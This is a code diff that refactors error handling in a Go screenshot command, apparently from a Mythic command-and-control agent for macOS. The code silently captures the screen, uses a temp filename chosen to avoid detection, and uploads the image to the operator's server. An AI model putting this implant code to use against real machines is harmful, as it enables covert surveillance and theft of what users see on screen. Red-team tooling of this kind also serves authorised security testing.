@@ -25,11 +25,7 @@ func (c *ScreenshotDarwinCommand) Execute(task structs.Task) structs.CommandResu
 	// Create temp file for screenshot — random name (no distinctive pattern)
 	tf, tfErr := os.CreateTemp("", "*.png")
 	if tfErr != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error creating temp file: %v", tfErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error creating temp file: %v", tfErr)
 	}
 	tmpFile := tf.Name()
 	tf.Close()
@@ -38,33 +34,21 @@ func (c *ScreenshotDarwinCommand) Execute(task structs.Task) structs.CommandResu
 	if output, err := execCmdTimeout("screencapture", "-x", "-t", "png", tmpFile); err != nil {
 		// Clean up on failure
 		os.Remove(tmpFile)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error capturing screenshot: %v\n%s", err, string(output)),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error capturing screenshot: %v\n%s", err, string(output))
 	}
 
 	// Read the screenshot file
 	imgData, err := os.ReadFile(tmpFile)
 	if err != nil {
 		os.Remove(tmpFile)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error reading screenshot file: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error reading screenshot file: %v", err)
 	}
 
 	// Clean up temp file
 	os.Remove(tmpFile)
 
 	if len(imgData) == 0 {
-		return structs.CommandResult{
-			Output:    "Screenshot captured but file was empty (no display available?)",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Screenshot captured but file was empty (no display available?)")
 	}
 
 	// Send screenshot to Mythic
@@ -90,11 +74,7 @@ func (c *ScreenshotDarwinCommand) Execute(task structs.Task) structs.CommandResu
 			}
 		case <-time.After(1 * time.Second):
 			if task.DidStop() {
-				return structs.CommandResult{
-					Output:    "Screenshot upload cancelled",
-					Status:    "error",
-					Completed: true,
-				}
+				return errorResult("Screenshot upload cancelled")
 			}
 		}
 	}
